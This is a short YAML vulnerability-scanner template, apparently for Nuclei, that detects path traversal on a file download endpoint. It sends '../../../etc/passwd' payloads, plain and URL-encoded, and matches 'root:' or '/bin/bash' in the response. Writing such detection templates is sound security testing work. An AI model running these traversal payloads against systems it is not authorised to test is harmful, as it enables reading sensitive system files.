id: ch2-path-traversal

info:
  name: Path Traversal - File Download Endpoint
  author: manikanta2834
  severity: high
  description: Detects path traversal in file download endpoint
  tags: lfi,path-traversal

http:
  - method: GET
    path:
      - "{{BaseURL}}/download?file=../../../etc/passwd"
      - "{{BaseURL}}/download?file=..%2F..%2F..%2Fetc%2Fpasswd"

    matchers:
      - type: word
        part: body
        words:
          - "root:"
          - "/bin/bash"
        condition: or
